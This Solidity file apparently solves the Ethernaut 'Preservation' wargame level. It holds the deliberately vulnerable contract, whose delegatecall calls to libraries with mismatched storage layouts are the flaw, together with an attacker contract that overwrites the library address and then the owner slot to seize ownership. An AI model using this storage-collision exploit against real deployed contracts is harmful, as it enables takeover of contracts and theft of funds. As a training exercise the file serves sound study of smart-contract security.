// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "hardhat/console.sol";

contract Preservation {
    // public library contracts
    address public timeZone1Library;    // slot 0
    address public timeZone2Library;    // slot 1
    address public owner;               // slot 2
    uint256 storedTime;                 // slot 3
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        // console.log("setFirst %s", _timeStamp);
        (bool success, ) = timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        require(success, "delegation fail");
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        // console.log("setSecond %s", _timeStamp);
        (bool success, ) = timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        require(success, "delegation fail");
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;     // slot 0

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}


interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttacker {
    // public library contracts
    address public slot0;
    address public slot1;
    address public ownerSlot; // slot 2
    uint256 storedTime;

    function setTime(uint256 _addressAsUint) public {
        ownerSlot = address(uint160(_addressAsUint));
    }

    function attack(address _targetContract, address account) public {
        IPreservation preservation = IPreservation(_targetContract);

        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(account)));
    }
}